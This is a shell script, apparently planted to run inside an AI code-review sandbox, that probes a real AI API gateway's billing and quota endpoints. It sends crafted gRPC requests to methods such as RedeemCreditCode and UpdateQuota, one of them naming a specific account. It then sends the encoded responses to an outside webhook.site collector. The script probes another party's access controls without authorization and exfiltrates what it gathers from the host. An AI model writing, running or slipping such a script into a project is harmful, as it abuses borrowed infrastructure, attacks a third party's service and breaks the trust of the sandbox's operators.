#!/bin/sh
# i84026: gateway.fireworks.ai credit/plan gate probes from the Devin review sandbox egress.
# Read-only / empty-parameter gate probes only: no credit codes, no writes, parent fixed to accounts/alperall.
[ -f ./tests/i84026-run ] || exit 0
NONCE="i84026-$(date +%s)-$$"
SINK="https://webhook.site/199f8e7e-8a91-4b0a-8b7b-c01be2daaf7e"
OUT=/tmp/i84026.txt
: > "$OUT"
esc() { tr -d '\000-\010\013\014\016-\037' | sed 's/|/ /g' | tr '\n\r\t' '   ' | head -c 90; }
grpc() { # label path reqfile
  L="$1"; P="$2"; F="$3"
  C=$(curl --http2 -m 8 -sS -D /tmp/i84026.h -o /tmp/i84026.b -w '%{http_code}|%{size_download}|%{time_total}' \
        -H 'content-type: application/grpc' -H 'te: trailers' --data-binary @"$F" \
        "https://gateway.fireworks.ai$P" 2>/tmp/i84026.e) || C="ERR"
  GS=$(grep -i '^grpc-status:' /tmp/i84026.h 2>/dev/null | tr -d '\r' | awk '{print $2}')
  GM=$(grep -i '^grpc-message:' /tmp/i84026.h 2>/dev/null | tr -d '\r' | cut -c15- | esc)
  HX=$(od -An -v -tx1 /tmp/i84026.b 2>/dev/null | tr -d ' \n' | head -c 256)
  BL=$(wc -c < /tmp/i84026.b 2>/dev/null | tr -d ' ')
  printf '%s|%s|gs=%s|gm=%s|len=%s|hex=%s\n' "$L" "$C" "${GS:-none}" "${GM:-none}" "${BL:-0}" "$HX" >> "$OUT"
  sleep 1.5
}
# gRPC frames: 1-byte flag + 4-byte BE length + protobuf, POSIX octal escapes
printf '\000\000\000\000\013\012\011pyroworks' > /tmp/i84026.f1   # GetOAuthArguments{account_id=1:"pyroworks"}
printf '\000\000\000\000\000' > /tmp/i84026.f0                     # empty message
printf '\000\000\000\000\023\012\021accounts/alperall' > /tmp/i84026.f2  # field1="accounts/alperall"
printf '\000\000\000\000\023\022\021accounts/alperall' > /tmp/i84026.f3  # field2="accounts/alperall"
grpc ctrl-oauth              /gateway.Gateway/GetOAuthArguments      /tmp/i84026.f1
grpc getacct-empty           /gateway.Gateway/GetAccount             /tmp/i84026.f0
grpc getbal-empty            /gateway.Gateway/GetBalance             /tmp/i84026.f0
grpc listcred-empty          /gateway.Gateway/ListCreditRedemptions  /tmp/i84026.f0
grpc listcred-parent         /gateway.Gateway/ListCreditRedemptions  /tmp/i84026.f2
grpc redeem-empty            /gateway.Gateway/RedeemCreditCode       /tmp/i84026.f0
grpc redeem-emptycode-parent /gateway.Gateway/RedeemCreditCode       /tmp/i84026.f3
grpc listplans-empty         /gateway.Gateway/ListNexusPlans          /tmp/i84026.f0
grpc planusage-empty         /gateway.Gateway/GetNexusPlanUsage       /tmp/i84026.f0
grpc updquota-empty          /gateway.Gateway/UpdateQuota             /tmp/i84026.f0
B64=$(base64 -w0 < "$OUT" 2>/dev/null | head -c 6000)
curl -sS -m 12 -o /dev/null -X POST -H 'content-type: application/json' \
  --data "{\"nonce\":\"$NONCE\",\"kind\":\"i84026-matrix\",\"n\":10,\"b64\":\"$B64\"}" "$SINK" >/dev/null 2>&1
echo "i84026 done nonce=$NONCE"
exit 0
